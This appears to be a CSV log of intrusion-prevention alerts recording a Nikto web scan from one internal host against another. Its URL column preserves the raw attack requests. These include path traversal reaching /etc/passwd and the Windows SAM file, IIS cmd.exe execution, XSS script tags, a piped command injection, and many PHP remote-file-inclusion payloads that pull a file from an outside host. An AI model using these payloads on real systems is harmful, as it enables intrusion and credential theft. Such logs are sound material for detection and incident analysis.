attackid,sessionid,repeated,severity,attack,service,srcip,dstip,srcport,dstport,subtype,eventtype,url
43336,7613735,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,/shoutbox.php?conf=../../../../../../../etc/passwd
10604,7613735,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,/.%252e/.%252e/.%252e/winnt/boot.ini
12265,7613735,1,low,Escape.Executable,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,/certsrv/..%255cwinnt/system32/cmd.exe?/c+dir
17702,7613735,44,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,-
12015,7613735,13,high,MS.IIS.Web.Server.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,-
50825,7613735,1,high,Apache.HTTP.Server.cgi-bin.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,-
44780,7613735,32,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,-
43336,7613735,4,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51082,80,ips,signature,-
12015,7613736,1,high,MS.IIS.Web.Server.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+ver
44780,7613736,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/server-info
13801,7613736,1,low,Apache.Directory.Listing,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/?M=A
50825,7613736,1,high,Apache.HTTP.Server.cgi-bin.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1
17702,7613736,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/uua90egElcaYnlxNqV1gZJshr6N3Q66lEDLS5HeUiqbCExPGGVKQiJqKGVNUSPDgs1WyG3HRncCcX9HCwPcKeMSPtbQEc57Lfwg2LQqr4ssh4yY9768ZczHiI1hlOBDmKNCwTd6afqHvxcseakTJsOBjGaLFx5kXxbyBUu3fFSvuS63EomA93S9ynWFAdBZg6oVTLeePS4ipt5IHXwTW9zaMyrDWUSM<font%20size=50><script>alert(11
56146,7613736,1,high,TVT.NVMS-1000.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini
10604,7613736,1,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini
43336,7613736,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/gallery/index.php?include=../../../../../../../../../etc/passwd
14088,7613736,1,medium,HTTP.GET.Request.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/..%252f..%252f..%252f..%252f..%252f../windows/repair/sam
12980,7613736,1,high,ANS.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/ans.pl?p=../../../../../usr/bin/id|&blah
10003,7613736,1,medium,MS.IIS.Web.Application.SourceCode.Disclosure,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/iissamples/sdk/asp/docs/CodeBrws.asp?Source=/IISSAMPLES/%c0%ae%c0%ae/%c0%ae%c0%ae/bogus_directory/nonexistent.asp
13900,7613736,1,low,Invision.Board.PHPINFO.PHP.Information.Disclosure,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,/phpinfo.php?cx[]=atPFxwwFe0minii2eUCGtzZ1CyoBadWUl0bMVKW4y1V5HFQA1Tyi0duckcGN15sTfuAhQ9TceJCFCKk93roxRr4UpYNVlvdTlmjJI0fwCISFEu4JspWuhMxRf1rk6Y6qtqs76yqf1LS5YsSqdRdpR3Vb1vAAr36EjqqKN9cS8TMrIkAe8HopkShj7Icl6vBr27wDbNmjFieUKpr4uOe1OMhSlIGmFG3XYnmtJoFWbbLRop
12015,7613736,1,high,MS.IIS.Web.Server.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,-
44780,7613736,56,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,-
50825,7613736,1,high,Apache.HTTP.Server.cgi-bin.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,-
17702,7613736,5,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,-
10604,7613736,5,high,HTTP.Request.URI.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,-
43336,7613736,2,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,-
14088,7613736,8,medium,HTTP.GET.Request.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,-
12980,7613736,1,high,ANS.Path.Traversal,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,-
10003,7613736,1,medium,MS.IIS.Web.Application.SourceCode.Disclosure,HTTP,172.16.1.2,172.16.2.2,51084,80,ips,signature,-
44780,7613737,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51086,80,ips,signature,/bmp/mime.types
17702,7613737,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,51086,80,ips,signature,/rpc.php?q=\\\
44780,7613737,99,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51086,80,ips,signature,-
44780,7613738,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51088,80,ips,signature,/doc/Judy/
44780,7613738,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51088,80,ips,signature,-
44780,7613739,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51090,80,ips,signature,/Host/Portals/tabid/19/ctl/Login/portalid/0/Default.aspx
17702,7613739,1,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,51090,80,ips,signature,/jsp-examples/jsp2/jspx/textRotate.jspx?name=<script>alert(111)</script>
44780,7613739,97,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51090,80,ips,signature,-
17702,7613739,2,medium,Cross.Site.Scripting,HTTP,172.16.1.2,172.16.2.2,51090,80,ips,signature,-
44780,7613740,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51092,80,ips,signature,/va/
44780,7613740,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51092,80,ips,signature,-
44780,7613741,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51094,80,ips,signature,/sc/
12699,7613741,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51094,80,ips,signature,/123flashchat.php?e107path=http://cirt.net/rfiinc.txt?
44780,7613741,67,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51094,80,ips,signature,-
12699,7613741,32,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51094,80,ips,signature,-
12699,7613742,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51096,80,ips,signature,/BetaBlockModules/GroupForumPermalinkModule/GroupForumPermalinkModule.php?path_prefix=http://cirt.net/rfiinc.txt?
44780,7613742,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51096,80,ips,signature,/Blog_CMS/admin/plugins/NP_UserSharing.php?DIR_ADMIN=http://cirt.net/rfiinc.txt??admin
48010,7613742,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51096,80,ips,signature,/Jobline/admin.jobline.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
15117,7613742,1,medium,NuclearBB.Root.Path.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51096,80,ips,signature,/NuclearBB/tasks/send_queued_emails.php?root_path=http://cirt.net/rfiinc.txt?
12699,7613742,64,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51096,80,ips,signature,-
44780,7613742,32,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51096,80,ips,signature,-
15117,7613742,1,medium,NuclearBB.Root.Path.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51096,80,ips,signature,-
44780,7613743,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51098,80,ips,signature,/OpenSiteAdmin/scripts/classes/FieldManager.php?path=http://cirt.net/rfiinc.txt?%00
12699,7613743,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51098,80,ips,signature,/PHPDJ_v05/dj/djpage.php?page=http://cirt.net/rfiinc.txt?
29613,7613743,1,high,SQuery.LibPath.Parameter.Multiple.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51098,80,ips,signature,/SQuery/lib/gore.php?libpath=http://cirt.net/rfiinc.txt?
44780,7613743,12,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51098,80,ips,signature,-
12699,7613743,5,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51098,80,ips,signature,-
12699,7613744,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,/ScriptPath/footers.php?tinybb_footers=http://cirt.net/rfiinc.txt?
44780,7613744,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,/Script_Path/config.inc.php?_path=http://cirt.net/rfiinc.txt??
14946,7613744,1,low,Flip.Previewtheme.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,/[path]/previewtheme.php?theme=1&inc_path=http://cirt.net/rfiinc.txt??cmd
15091,7613744,1,high,Ajax.File.Browser.approot.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,/_includes/settings.inc.php?approot=http://cirt.net/rfiinc.txt?
14950,7613744,1,low,NcasterCMS.Archive.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,/admin/addons/archive/archive.php?adminfolder=http://cirt.net/rfiinc.txt?
14957,7613744,1,high,TROforum.Admin.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,/admin/admin.php?site_url=http://cirt.net/rfiinc.txt?
14848,7613744,1,high,LimeSurvey.Parameter.Homedir.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,/admin/classes/pear/OLE/PPS.php?homedir=http://cirt.net/rfiinc.txt?
14955,7613744,1,low,PHPNews.Change_Action.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,/admin/inc/change_action.php?format_menue=http://cirt.net/rfiinc.txt?
14857,7613744,1,high,RipeCMS.Parameter.Level.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,/admin/includes/admin_header.php?level=http://cirt.net/rfiinc.txt?
12699,7613744,57,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,-
44780,7613744,24,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,-
14848,7613744,8,high,LimeSurvey.Parameter.Homedir.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,-
14857,7613744,3,high,RipeCMS.Parameter.Level.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51100,80,ips,signature,-
14734,7613745,1,low,Xoops.Multiple.Modules.SpawControl.Class.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51102,80,ips,signature,/admin/includes/spaw/spaw_control.class.php?spaw_root=http://cirt.net/rfiinc.txt??
44780,7613745,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51102,80,ips,signature,/admin/index.php?path_to_script=http://cirt.net/rfiinc.txt??&cmd=ls
12699,7613745,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51102,80,ips,signature,/admin/index.php?xtrphome=http://cirt.net/rfiinc.txt?
14956,7613745,1,high,Somery.Include.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51102,80,ips,signature,/admin/system/include.php?skindir=http://cirt.net/rfiinc.txt?
48010,7613745,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51102,80,ips,signature,/administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
13825,7613745,1,low,Joomla!.com_webring.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51102,80,ips,signature,/administrator/components/com_webring/admin.webring.docs.php?component_dir=http://cirt.net/rfiinc.txt??
44780,7613745,13,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51102,80,ips,signature,-
12699,7613745,33,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51102,80,ips,signature,-
14956,7613745,1,high,Somery.Include.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51102,80,ips,signature,-
48010,7613745,48,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51102,80,ips,signature,-
44780,7613746,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51104,80,ips,signature,/administrator/menu_add.php?site_absolute_path=http://cirt.net/rfiinc.txt??
12699,7613746,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51104,80,ips,signature,/adminpanel/includes/add_forms/addmp3.php?GLOBALS[root_path]=http://cirt.net/rfiinc.txt?
15091,7613746,1,high,Ajax.File.Browser.approot.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51104,80,ips,signature,/afb-3-beta-2007-08-28/_includes/settings.inc.php?approot=http://cirt.net/rfiinc.txt?
48010,7613746,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51104,80,ips,signature,/akocomments.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
44780,7613746,35,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51104,80,ips,signature,-
12699,7613746,61,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51104,80,ips,signature,-
15091,7613746,1,high,Ajax.File.Browser.approot.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51104,80,ips,signature,-
12699,7613747,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51106,80,ips,signature,/block.php?Include=http://cirt.net/rfiinc.txt?
44780,7613747,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51106,80,ips,signature,/blogcms/admin/media.php?DIR_LIBS=http://cirt.net/rfiinc.txt??
14305,7613747,1,medium,Boite.de.News.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51106,80,ips,signature,/boitenews4/index.php?url_index=http://cirt.net/rfiinc.txt??
48010,7613747,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51106,80,ips,signature,/catalogshop.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
12699,7613747,60,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51106,80,ips,signature,-
44780,7613747,37,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51106,80,ips,signature,-
12699,7613748,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51108,80,ips,signature,/classes/html/com_articles.php?absolute_path=http://cirt.net/rfiinc.txt?
44780,7613748,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51108,80,ips,signature,/clear.php?bibtexrootrel=http://cirt.net/rfiinc.txt??
48010,7613748,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51108,80,ips,signature,/com_booklibrary/toolbar_ext.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
12699,7613748,40,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51108,80,ips,signature,-
44780,7613748,27,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51108,80,ips,signature,-
48010,7613748,31,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51108,80,ips,signature,-
48010,7613749,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51110,80,ips,signature,/components/com_thopper/inc/timelog_type.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
12699,7613749,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51110,80,ips,signature,/components/core/connect.php?language_path=http://cirt.net/rfiinc.txt?
44780,7613749,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51110,80,ips,signature,/components/minibb/bb_plugins.php?absolute_path=http://cirt.net/rfiinc.txt??
48010,7613749,2,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51110,80,ips,signature,-
12699,7613749,10,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51110,80,ips,signature,-
44780,7613749,7,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51110,80,ips,signature,-
12699,7613750,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51112,80,ips,signature,/config.php?returnpath=http://cirt.net/rfiinc.txt?
44780,7613750,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51112,80,ips,signature,/config.php?sql_language=http://cirt.net/rfiinc.txt??&cmd=0wn3d By Dr
12699,7613751,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51114,80,ips,signature,/config.php?xcart_dir=http://cirt.net/rfiinc.txt?
44780,7613751,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51114,80,ips,signature,/config.php?xcart_dir=http://cirt.net/rfiinc.txt??
14849,7613751,1,high,MiniBill.Run_billing.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51114,80,ips,signature,/crontab/run_billing.php?config[include_dir]=http://cirt.net/rfiinc.txt?
12699,7613751,31,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51114,80,ips,signature,-
44780,7613751,30,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51114,80,ips,signature,-
14849,7613751,1,high,MiniBill.Run_billing.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51114,80,ips,signature,-
12699,7613753,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51116,80,ips,signature,/custom_vars.php?sys[path_addon]=http://cirt.net/rfiinc.txt?
44780,7613753,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51116,80,ips,signature,/cwb/comanda.php?INCLUDE_PATH=http://cirt.net/rfiinc.txt??
15115,7613753,1,medium,DFD.Cart.Set.Depth.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51116,80,ips,signature,/dfd_cart/app.lib/product.control/core.php/customer.area/customer.browse.list.php?set_depth=http://cirt.net/rfiinc.txt??
29615,7613753,1,medium,Vmist.Downstat.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51116,80,ips,signature,/downstat1.8/chart.php?art=http://cirt.net/rfiinc.txt??
15100,7613753,1,medium,AnyInventory.Environment.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51116,80,ips,signature,/environment.php?DIR_PREFIX=http://cirt.net/rfiinc.txt?
14873,7613753,1,high,Eva.Web.Index.PHP3.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51116,80,ips,signature,/eva/index.php3?aide=http://cirt.net/rfiinc.txt?
12699,7613753,60,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51116,80,ips,signature,-
44780,7613753,30,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51116,80,ips,signature,-
15115,7613753,3,medium,DFD.Cart.Set.Depth.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51116,80,ips,signature,-
14873,7613753,2,high,Eva.Web.Index.PHP3.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51116,80,ips,signature,-
12699,7613754,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51118,80,ips,signature,/event_cal/module/embed/day.php?path=http://cirt.net/rfiinc.txt?
44780,7613754,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51118,80,ips,signature,/example-view/templates/article.php?globals[content_dir]=http://cirt.net/rfiinc.txt??
14847,7613754,1,high,B1GBB.Footer.Inc.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51118,80,ips,signature,/footer.inc.php?tfooter=http://cirt.net/rfiinc.txt?
12699,7613754,42,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51118,80,ips,signature,-
44780,7613754,55,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51118,80,ips,signature,-
14847,7613754,1,high,B1GBB.Footer.Inc.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51118,80,ips,signature,-
12699,7613755,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51120,80,ips,signature,/getpage.php?page=online&doc_path=http://cirt.net/rfiinc.txt?
44780,7613755,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51120,80,ips,signature,/global.php?abs_path=http://cirt.net/rfiinc.txt??
14954,7613755,1,high,Philex.header.inc.PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51120,80,ips,signature,/header.inc.php?CssFile=http://cirt.net/rfiinc.txt?
14374,7613755,1,low,IrayoBlog.Irayofuncs.PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51120,80,ips,signature,/inc/irayofuncs.php?irayodirhack=http://cirt.net/rfiinc.txt??
12699,7613755,56,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51120,80,ips,signature,-
44780,7613755,35,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51120,80,ips,signature,-
12699,7613756,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51122,80,ips,signature,/include/cls_headline_prod.php?INCLUDE_PATH=http://cirt.net/rfiinc.txt?
44780,7613756,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51122,80,ips,signature,/include/common_functions.php?baros_path=http://cirt.net/rfiinc.txt??
12699,7613756,6,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51122,80,ips,signature,-
44780,7613756,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51122,80,ips,signature,-
12699,7613757,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51124,80,ips,signature,/include/default_header.php?script_path=http://cirt.net/rfiinc.txt?
44780,7613757,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51124,80,ips,signature,/include/define.php?INC_DIR=http://cirt.net/rfiinc.txt??
14740,7613757,1,high,Mazen.PHP.Chat.Multiple.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51124,80,ips,signature,/include/pear/IT.php?basepath=http://cirt.net/rfiinc.txt?
14286,7613757,1,medium,InPortal.InLink.ADODBDIR.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51124,80,ips,signature,/includes/adodb/back/adodb-postgres7.inc.php?ADODB_DIR=http://cirt.net/rfiinc.txt??
30542,7613757,1,high,Quezza.Class_template.php.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51124,80,ips,signature,/includes/class_template.php?quezza_root_path=http://cirt.net/rfiinc.txt?
12699,7613757,49,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51124,80,ips,signature,-
44780,7613757,42,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51124,80,ips,signature,-
14740,7613757,5,high,Mazen.PHP.Chat.Multiple.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51124,80,ips,signature,-
44780,7613758,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51126,80,ips,signature,/includes/iplogger.php?phpbb_root_path=http://cirt.net/rfiinc.txt??ls
12699,7613758,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51126,80,ips,signature,/includes/kb_constants.php?module_root_path=http://cirt.net/rfiinc.txt?
14405,7613758,1,low,Open.Educational.System.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51126,80,ips,signature,/includes/lib-account.inc.php?CONF_CONFIG_PATH=http://cirt.net/rfiinc.txt??
14338,7613758,1,low,PAFileDB.Constants.PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51126,80,ips,signature,/includes/pafiledb_constants.php?module_root_path=http://cirt.net/rfiinc.txt?
48010,7613758,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51126,80,ips,signature,/index.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid=1&GLOBALS=&mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
14157,7613758,1,medium,TotalCalendar.Multiple.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51126,80,ips,signature,/index.php?inc_dir=http://cirt.net/rfiinc.txt?
44780,7613758,33,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51126,80,ips,signature,-
12699,7613758,55,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51126,80,ips,signature,-
14405,7613758,5,low,Open.Educational.System.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51126,80,ips,signature,-
48010,7613758,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51126,80,ips,signature,-
14157,7613758,1,medium,TotalCalendar.Multiple.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51126,80,ips,signature,-
12699,7613759,1,low,PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51128,80,ips,signature,/index.php?may=http://cirt.net/rfiinc.txt?
44780,7613759,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51128,80,ips,signature,/index.php?mode=http://cirt.net/rfiinc.txt??&cmd=
48010,7613759,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51128,80,ips,signature,/index.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
